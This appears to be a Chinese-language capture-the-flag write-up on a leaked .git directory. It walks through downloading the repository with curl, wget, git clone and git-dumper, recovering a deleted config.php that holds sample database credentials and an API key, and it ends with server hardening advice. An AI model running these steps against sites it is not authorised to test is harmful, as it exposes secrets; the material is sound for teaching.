# A02 Security Misconfiguration - Easy 解题思路

## 漏洞分析

本题考察的是**生产环境部署时未删除 `.git` 目录**导致的安全配置错误问题。

当使用Git进行版本控制的项目部署到Web服务器时，如果未正确配置Web服务器或忘记删除 `.git` 目录，攻击者可以直接访问该目录，从而：
1. 下载整个Git仓库的历史记录
2. 通过 `git log` 查看所有提交历史
3. 通过 `git show` 查看每次提交的具体内容
4. 发现被删除但仍存在于历史记录中的敏感文件（如配置文件、密钥、密码等）

## 利用步骤

### 步骤1：发现 .git 目录泄露

使用目录扫描工具或直接访问：

```bash
curl http://<target>/.git/HEAD
```

如果返回类似 `ref: refs/heads/master` 的内容，说明 `.git` 目录可以直接访问。

### 步骤2：下载 .git 目录

#### 方法一：使用 wget 递归下载

```bash
wget -r http://<target>/.git/
```

#### 方法二：使用 git clone

```bash
git clone http://<target>/.git/ leaked_repo
cd leaked_repo
```

#### 方法三：使用 git-dumper 工具

```bash
pip install git-dumper
git-dumper http://<target>/.git/ leaked_repo
```

### 步骤3：查看提交历史

```bash
cd leaked_repo
git log --oneline
```

预期输出：
```
3a4b5c6 docs: 添加项目说明文档
7d8e9f0 security: 移除敏感配置文件，避免泄露（紧急修复）
1a2b3c4 feat: 添加生产环境配置文件
```

可以看到，开发团队曾提交过一个配置文件，随后又将其删除。

### 步骤4：查看被删除的敏感文件内容

```bash
git show 1a2b3c4:config.php
```

或查看所有历史文件中包含 "flag" 的内容：

```bash
git log --all --full-history -p -- config.php
```

在历史提交中，可以找到包含Flag的 `config.php` 文件内容：

```php
<?php
$db_host = 'localhost';
$db_user = 'admin';
$db_pass = 'S3cr3tP@ssw0rd_2025!';
$db_name = 'xingchen_production';
$api_key = 'sk-prod-xc-9f8d7e6c5b4a3210';
$flag = 'flag{...}';
?>
```

## 修复建议

1. **部署前删除 .git 目录**
   ```bash
   rm -rf .git
   ```

2. **配置Web服务器禁止访问敏感目录**
   - Nginx:
     ```nginx
     location ~ /\. {
         deny all;
         return 404;
     }
     ```
   - Apache:
     ```apache
     <DirectoryMatch "^\.">
         Require all denied
     </DirectoryMatch>
     ```

3. **使用 `.gitignore` 保护敏感文件**
   确保敏感配置文件（如 `config.php`、`.env` 等）不会被提交到仓库。

4. **使用 CI/CD 工具自动清理**
   在构建和部署流程中自动删除 `.git` 目录及其他开发环境文件。

5. **使用专用部署工具**
   如 `rsync --exclude='.git'` 或 Docker 多阶段构建，只复制必要的生产文件。

6. **定期安全审计**
   使用工具扫描目标站点是否存在 `.git`、`.svn`、`.env`、`.DS_Store` 等敏感文件泄露。
